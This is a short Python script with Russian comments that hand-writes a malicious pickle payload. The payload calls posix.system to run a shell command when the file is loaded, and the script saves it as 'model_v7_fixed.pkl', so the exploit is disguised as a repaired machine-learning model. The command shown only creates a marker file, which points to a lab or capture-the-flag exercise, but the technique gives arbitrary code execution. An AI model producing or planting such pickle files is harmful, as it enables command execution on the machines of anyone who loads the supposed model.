# Исправляем байт-код:
# c - команда GLOBAL
# posix - имя модуля (в Linux 'os' ссылается на 'posix')
# system - имя функции
# Дальше аргументы и выполнение

payload = b"cposix\nsystem\n(S'touch /app/MANUAL_BYTECODE_WIN.txt'\ntR."

with open('model_v7_fixed.pkl', 'wb') as f:
    f.write(payload)

print("Исправленная модель 'model_v7_fixed.pkl' создана!")
